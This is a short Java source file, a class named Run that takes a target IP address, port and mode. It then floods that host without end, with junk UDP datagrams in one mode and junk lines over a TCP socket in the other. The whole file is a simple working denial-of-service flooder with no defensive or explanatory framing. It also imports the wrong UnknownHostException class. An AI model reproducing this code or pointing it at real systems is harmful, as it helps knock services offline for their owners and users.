import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.rmi.UnknownHostException;


public class Run {
	public Run(String ip, int port, int type) throws IOException {
		switch(type) {
		case 0:
			try {
				InetAddress remoteInetAddress = InetAddress.getByName(ip);
				byte[] message = "a;sdjfa;djfa;dsjfad;sjfa;sjfa;djfa;sdfjsa;f".getBytes();
				DatagramPacket datagramPacket = new DatagramPacket(message, message.length, remoteInetAddress, port);
				DatagramSocket datagramSocket = new DatagramSocket();

				// Check if the message size is greater that the send buffer size, if yes throw an exception
				if (message.length > datagramSocket.getSendBufferSize()) {
					throw new IOException("Too much data");
				}
				while(true) {
					// Send the datagram packet
					datagramSocket.send(datagramPacket);
				}
				// Close the Datagram socket
				//datagramSocket.close();
			} catch (Exception e) { System.err.println("Error: " + e); }
			break;
		case 1: {
			Socket echoSocket = null;
			PrintWriter out = null;
			BufferedReader in = null;

			try {
				echoSocket = new Socket(ip, port);
				out = new PrintWriter(echoSocket.getOutputStream(), true);
			} catch (UnknownHostException e) {
				System.err.println("Don't know about host: " + ip);
				System.exit(1);
			} catch (IOException e) {
				System.err.println("Couldn't get I/O for "
						+ "the connection to: " + ip);
				e.printStackTrace();
				System.exit(1);
			}

			while (true) {
				out.println("ldajf;adjfda;sjf;asjfa;dkjfasjf;asjfsadjfa;sfjs;jf");
			}
		}

		}
	}
}
